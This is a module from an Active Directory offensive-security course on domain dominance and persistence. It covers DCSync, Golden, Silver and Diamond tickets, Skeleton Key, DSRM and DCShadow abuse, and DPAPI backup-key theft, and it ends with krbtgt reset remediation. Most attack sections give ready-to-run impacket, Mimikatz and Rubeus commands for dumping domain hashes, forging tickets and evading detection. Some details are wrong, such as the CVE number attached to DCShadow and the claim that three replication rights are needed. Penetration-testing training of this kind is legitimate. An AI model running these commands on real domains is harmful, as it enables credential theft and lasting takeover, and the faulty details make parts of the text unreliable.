# Module 09: Domain Dominance, Persistence & DCSync Internals

> **Navigation**: [⬅️ Module 08: ACL & ACE Abuse](Module-08-Active-Directory-Access-Control-and-ACL-Abuse.md) | [🏠 Master Index](../README.md) | [Module 10: Operator Playbook & Troubleshooting ➡️](Module-10-Field-Operator-Playbook-and-Troubleshooting.md)

---


## 1. DCSync: Protocol Architecture & MS-DRSR Exploitation

The **DCSync** technique, developed by Benjamin Delpy and Vincent Le Toux in Mimikatz, is widely regarded as the ultimate privilege escalation and credential extraction technique in Active Directory.

```
+-----------------------------------------------------------------------------------------+
| DCSYNC ATTACK MECHANICS (MS-DRSR PROTOCOL REPLICATION)                                  |
|                                                                                         |
|  ATTACKER (Holding Replication Rights)                 DOMAIN CONTROLLER (DC01)         |
|  IP: 10.0.0.150                                         IP: 10.0.0.1                    |
|            |                                                   |                        |
|            | 1. Bind to Directory Replication Service RPC      |                        |
|            |    Interface: DRSUAPI (Port 135 / Dynamic RPC)    |                        |
|            +-------------------------------------------------->|                        |
|            | 2. RPC Bind Accepted                              |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|            | 3. IDL_DRSGetNCChanges Request:                   |                        |
|            |    "Hello DC01! I am a Domain Controller.         |                        |
|            |     Replicate user secrets for: KRBTGT!"          |                        |
|            +-------------------------------------------------->|                        |
|                                                                |                        |
|                                                                | DC01 inspects caller:  |
|                                                                | Checks DACL on domain: |
|                                                                | Has Replication Rights!|
|                                                                |                        |
|            | 4. IDL_DRSGetNCChanges Response:                  |                        |
|            |    Returns user metadata, NT Hashes,              |                        |
|            |    AES-128/256 Kerberos Keys, and History Hashes! |                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|  Attacker dumps KRBTGT AES Key! Forest Compromise Complete! Zero Code Exec on DC!       |
+-----------------------------------------------------------------------------------------+
```

### Why DCSync is Undetectable to Traditional Host Security:
1. **Zero Code Execution**: The attacker never uploads a binary, never executes a command, and never logs into the Domain Controller interactively.
2. **Legitimate Administrative Protocol**: DCSync uses the standard **Microsoft Directory Replication Service Remote Protocol (MS-DRSR)** that legitimate Domain Controllers use to synchronize directory changes.
3. **Network-Level Operation**: The attack is executed entirely over the network via RPC (Port 135 and dynamic RPC ports 49152-65535).

---

### Required Active Directory Permissions:
To execute a DCSync, an account must hold the following three Extended Rights on the root domain object (`DC=corp,DC=local`):
1. **`DS-Replication-Get-Changes`** (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
2. **`DS-Replication-Get-Changes-All`** (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
3. **`DS-Replication-Get-Changes-In-Filtered-Set`** (GUID: `89e95b76-444d-4c62-991a-0201f302406c`)

> [!NOTE]
> By default, only members of **Domain Admins**, **Enterprise Admins**, and **Domain Controllers** possess these rights. However, misconfigured delegation, service accounts, or Exchange server permissions frequently award these rights to unprivileged users!

---

### Tool Mastery: Executing DCSync

#### 1. Remote Execution via Impacket `secretsdump.py`:
```bash
# Dump the KRBTGT account hash and Kerberos AES keys:
impacket-secretsdump 'corp.local/admin_user:Pass123!@10.0.0.1' -just-dc-user krbtgt

# Dump all accounts in the entire Active Directory domain:
impacket-secretsdump 'corp.local/admin_user:Pass123!@10.0.0.1' -just-dc -outputfile corp_ntds_dump

# Execute DCSync using Pass-the-Hash (no plaintext password needed):
impacket-secretsdump -hashes :e5fc4f2b49d70367b54da724e1185ac4 'corp.local/admin_user@10.0.0.1' -just-dc-user krbtgt
```

#### 2. Windows Host Execution via Mimikatz:
```text
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator
```

---

## 2. Golden Ticket: Forging Master Ticket Granting Tickets

A **Golden Ticket** is a forged Kerberos Ticket Granting Ticket (TGT) created by an attacker using the master encryption key of the domain's **`krbtgt`** service account.

```
+-----------------------------------------------------------------------------------------+
| GOLDEN TICKET ANATOMY & FORGERY                                                         |
|                                                                                         |
|  Forged TGT Components:                                                                 |
|  * User Identity: Administrator (or any arbitrary username)                             |
|  * Domain SID: S-1-5-21-3914562810-2856192837-1928374619                                |
|  * Group Memberships: Domain Admins (512), Enterprise Admins (519), Schema Admins (518) |
|  * SID History: Injected cross-domain SIDs for forest-wide escalation                   |
|  * Validity Lifetime: 10 Years (Default is 10 hours)                                    |
|                                                                                         |
|  Encrypted & Signed using: KRBTGT NTLM Hash or AES-256 Key                              |
+-----------------------------------------------------------------------------------------+
```

### Why a Golden Ticket Grants God-Mode Authority:
When a user presents a TGT to the KDC during a `TGS-REQ`:
1. The KDC **does not check Active Directory** to verify if the user exists or if the password was changed.
2. The KDC simply decrypts the TGT using its own `krbtgt` key.
3. If the ticket decrypts successfully and the timestamp is within valid parameters, the KDC trusts the PAC implicitly and issues Service Tickets for any requested service!

#### Generating a Golden Ticket with Impacket `ticketer.py`:
```bash
# Required Parameters:
# - Domain Name (-domain)
# - Domain SID (-domain-sid) -> Get via 'lookupsid.py' or 'whoami /user'
# - KRBTGT AES-256 Key or NT Hash (-aesKey or -nthash)
# - Target Username (-user)

impacket-ticketer -domain corp.local \
  -domain-sid S-1-5-21-3914562810-2856192837-1928374619 \
  -aesKey b576d1a938c2018274fbe81928374619b576d1a938c2018274fbe81928374619 \
  -groups 512,513,518,519,520 \
  Administrator

# Inject the generated ticket into your environment:
export KRB5CCNAME=Administrator.ccache

# Execute commands on any machine in the domain:
impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
```

---

## 3. Silver Ticket: Stealth Forgery Directly to Services

A **Silver Ticket** is a forged Kerberos Service Ticket (TGS) created using the password hash of the **target service account** (e.g., machine account `FILESERVER$` or service account `svc_sql`).

```
+---------------------------------------------------------------------------------------+
| COMPARISON: GOLDEN TICKET VS. SILVER TICKET                                           |
+-----------------------+--------------------------------+------------------------------+
| Property              | Golden Ticket (TGT)            | Silver Ticket (TGS)          |
+-----------------------+--------------------------------+------------------------------+
| **Encrypted With**    | KRBTGT Account Secret Key      | Target Service Account Key   |
| **Scope of Access**   | Entire Forest (Any machine)    | Single Target Service only   |
| **KDC Communication** | Communicates with KDC for TGS  | **NEVER CONTACTS THE KDC!**  |
| **KDC Event Logs**    | Generates Event 4769 on KDC    | **ZERO LOGS ON DOMAIN CTRL!**|
| **Persistence Value** | Supreme Master Key             | Ultra-Stealth Persistence    |
+-----------------------+--------------------------------+------------------------------+
```

### Operational Silver Ticket Creation:
```bash
# Forge a Silver Ticket for CIFS (SMB) access to FileServer01:
impacket-ticketer -domain corp.local \
  -domain-sid S-1-5-21-3914562810-2856192837-1928374619 \
  -nthash e5fc4f2b49d70367b54da724e1185ac4 \
  -spn cifs/fs01.corp.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass 'corp.local/Administrator@fs01.corp.local'
```

---

## 4. Diamond Tickets: Evasion of Modern Identity Threat Detection (ITDR)

Modern EDR and Identity Threat Detection and Response (ITDR) solutions detect traditional Golden Tickets by analyzing:
- Absence of preceding `AS-REQ` (Event ID 4768) log on the KDC.
- Anomalous ticket lifetimes (e.g., 10-year expiration).
- Mismatched Kerberos encryption types or session key structures.

### The Diamond Ticket Technique:
Instead of forging a TGT from scratch:
1. The attacker requests a **legitimate, genuine TGT** from the KDC as an unprivileged domain user.
2. The attacker uses the compromised `krbtgt` key to **decrypt the genuine TGT**.
3. The attacker modifies the PAC inside the ticket, injecting the Domain Admins SID (`512`) and Enterprise Admins SID (`519`).
4. The attacker recalculates the PAC checksums and re-encrypts the ticket using the `krbtgt` key.

```powershell
# Executing Diamond Ticket via Rubeus:
Rubeus.exe diamond /user:lowpriv_user /password:Pass123! \
  /krbtgt:e5fc4f2b49d70367b54da724e1185ac4 \
  /ticketuser:Administrator /ticketgroups:512,513,518,519,520 /ptt
```
* **Detection Bypass**: The KDC holds a legitimate `Event ID 4768` record for the initial ticket request, defeating naive anomaly-based SIEM detection rules!

---

## 5. Domain Persistence Primitives: Skeleton Key, DSRM & DCShadow

### 1. Skeleton Key (In-Memory LSASS Master Password):
Executed via Mimikatz (`misc::skeleton`) on a Domain Controller:
* Patches the `msv1_0.dll` and `kerberos.dll` authentication routines in the DC's LSASS memory.
* **Result**: Every account in the domain can still authenticate with their normal password, **BUT they can ALSO authenticate using the master password `mimikatz`**!
* **Volatility**: Resets upon Domain Controller reboot.

### 2. DSRM Account Persistence:
The **Directory Services Restore Mode (DSRM)** account is the local administrator account on a Domain Controller, created during DC promotion.
* By default, DSRM can only be accessed locally during Safe Mode boot.
* Attackers set registry key:
  `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2`
* **Result**: Allows logging into the Domain Controller over the network via SMB/WMI using the local DSRM Administrator account and Pass-the-Hash, even if Active Directory services are offline!

### 3. DCShadow (CVE-2018-4088):
Created by Benjamin Delpy and Vincent Le Toux:
* Registers a temporary rogue computer as an authoritative Domain Controller in the configuration partition using RPC (`DRSAddEntry`).
* Pushes malicious directory changes (e.g., adding user to Domain Admins or setting SID History) to legitimate DCs via directory replication!
* **Evasion**: Bypasses Active Directory object modification audit logs (`Event ID 5136`) because the changes arrive as legitimate replication streams rather than LDAP writes.

### 4. DPAPI Domain Backup Key Extraction (`BCKUPKEY_P` / `Gkdi`):
The Windows Data Protection API (DPAPI) encrypts sensitive user secrets (saved Chrome/Edge browser passwords, RDP connection strings, Wi-Fi profiles, and private certificates) on individual workstations.
* **The Domain Recovery Mechanism**: To permit password resets without data loss, Windows wraps each user's DPAPI master key with the **Domain Controller's DPAPI Backup Key** via MS-BKRP (BackupKey Remote Protocol).
* **The Master Compromise**: An attacker with Domain Administrator authority can remotely extract the domain's master DPAPI private key directly from the Domain Controller:
  ```bash
  # Remote extraction via Impacket:
  impacket-dpapi backupkeys -u 'Administrator' -p 'Pass123!' -d 'corp.local' -dc-ip 10.0.0.1 --export

  # Extraction via Mimikatz on a DC:
  lsadump::backupkeys /target:dc01.corp.local /export
  ```
* **Impact**: Once the `.pvk` backup key is in the attacker's possession, the attacker can pull locked DPAPI master keys from **ANY endpoint across the entire enterprise** and decrypt all stored credentials offline without generating any endpoint security telemetry!

---

## 6. Remediating Domain Compromise: The 2-Step `krbtgt` Password Reset

When an Active Directory domain suffers a compromise where the attacker obtained the `krbtgt` hash, **simply changing the `krbtgt` password once is fatal**.

### Why a Single Reset Fails:
Active Directory stores both the **current password** and the **previous password** for the `krbtgt` account to prevent breaking valid tickets during cross-DC replication latency. If you reset `krbtgt` once, existing Golden Tickets forged with the previous hash remain valid!

### The Official Microsoft Two-Step Procedure:
1. **Step 1: First `krbtgt` Password Reset**:
   * Reset the `krbtgt` password on the PDC Emulator.
   * Forces Active Directory to move the current compromised key to the "previous" key slot.
2. **Step 2: Wait for Forest Replication (24 - 48 Hours)**:
   * Allow sufficient time for the new key to replicate to every DC and for legitimate client Kerberos tickets to naturally refresh.
3. **Step 3: Second `krbtgt` Password Reset**:
   * Reset the `krbtgt` password a second time.
   * This completely overwrites the compromised key from the "previous" slot, immediately invalidating every Golden Ticket in existence!

```powershell
# Use Microsoft's official automated remediation script:
.\Reset-KrbTgt-Password-For-SPNs.ps1 -Mode Mode2 -CreateReport -Verbose
```


---

> **Navigation**: [⬅️ Module 08: ACL & ACE Abuse](Module-08-Active-Directory-Access-Control-and-ACL-Abuse.md) | [🏠 Master Index](../README.md) | [Module 10: Operator Playbook & Troubleshooting ➡️](Module-10-Field-Operator-Playbook-and-Troubleshooting.md)
